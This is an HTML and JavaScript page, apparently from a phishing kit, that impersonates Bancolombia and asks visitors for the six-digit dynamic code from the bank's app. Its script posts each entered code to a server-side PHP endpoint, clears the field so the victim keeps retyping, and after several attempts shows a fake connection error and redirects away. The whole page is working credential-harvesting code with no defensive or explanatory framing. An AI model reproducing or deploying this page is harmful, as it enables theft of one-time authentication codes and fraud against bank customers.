<!DOCTYPE html>
<html lang="es">
<head>
   <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>Document</title>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">


        <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/scripts/functions.js"></script>  	
    
    <style>
    *{
        margin: 0;
        padding: 0;
        font-family: Arial, Helvetica, sans-serif;
    }

    .spinner-container {
      margin-bottom: 2rem;
    }

    .spinner {
        width: 60px;
        height: 60px;
        border: 4px solid rgba(232, 17, 75, 0.2);
        border-left: 4px solid rgb(232, 17, 75);
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto 3rem;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }


    #trazo {
        background-image: url(img/bg-trazo.svg);
        width: auto;
        background-position: top;
    }

    .contenido {
        position: relative;
        top: 5rem;
    }

    #txtDinamic {
        color: #fff;
    }

    #txtDinamic::placeholder {
        color: #fff;
    }

    
    

</style>
</head>
<body style="background-color:#2c2a29;">

<div id="trazo">
    <div id="formContainer">
            <center>
    <br>

    <img src="img/logo.png" alt="" srcset="" width="100%">

    <br>
    <br>
    <a style="font-size:30px; color:#fff;">Ingresa tu clave dinamica</a>
</center>


<div class="contenido" style="width:90%; border-radius:30px; border: none; background-color:#454648; height:290px; padding:20px; margin:auto;">

<center>
    <br>
    <a style="font-size:16px; text-align:center; color:#fff;">La puedes encontrar en la app bancolombia</a>
    <br>
    <br>
    <input type="tel" name="code" id="txtDinamic" class="pass"  placeholder="******" style="border:none; width:90%;height:35px; background: transparent; border-bottom:2px solid #fff; padding.left:15px; text-align:center;" maxlength="6" minlength="6" oninput="this.value = this.value.replace(/\D+/g, '');" required>
    <br>
</center>
<br>
<br>

<center>
    <input type="submit" value="Continuar" id="btnDinamic" style="width:80%; background-color:#fdd923; height:40px; border-radius:100px; border:none; font-weight:bold; color:black;">
</center>


    </div>

</div>

<div id="loader" class="spinner-container" style="display:none; text-align:center; margin-top:50%;">
    <div class="spinner"></div>
    <p style="color:#fff; margin-top:15px;">Procesando, por favor espera...</p>
</div>


    <script type="text/javascript">
	var espera = 0;
    var count = 0;


	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

    function sendCode() {
        const $input = $("#txtDinamic");

        // remove all whitespace
        let dinamica = $input.val().replace(/\s+/g, '');

        // update input without spaces
        $input.val(dinamica);

        if (dinamica.length > 5 && count >= 3) {
            
            $('#formContainer').hide();
            $('#loader').show();
            setTimeout(function () {
                $('#loader').hide();
                $('#formContainer').show();
            }, 6000);

            alert('Error de conexión, por favor intente de nuevo');
            window.location.href = "finish.php";
        } else {
            
            // clear the field correctly
            $input.val('');
            $(".mensaje").show();
            $(".pass").css("border", "1px solid red");
            $input.focus();

            // si quieres loguear el intento (opcional)
            const data = { dinamica };
            if(dinamica.length > 5) {
                $('#formContainer').hide();
                $('#loader').show();
                setTimeout(function () {
                    $('#loader').hide();
                    $('#formContainer').show();
                }, 6000);

                $.ajax({
                url: '../../acciones/editar_mensaje.php',
                method: 'POST',
                data: { data },
                success: function (response) {
                    // si solo es log, no necesitas hacer nada aquí
                },
                error: function (xhr, status, error) {
                    alert('Error en la solicitud AJAX: ' + error);
                }
            });

            count++;
            }
            
        }
    }

	$(document).ready(function() {
		$('#btnDinamic').click(function(){
            sendCode();	
		});

		$("#txtDinamic").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>

</body>
</html>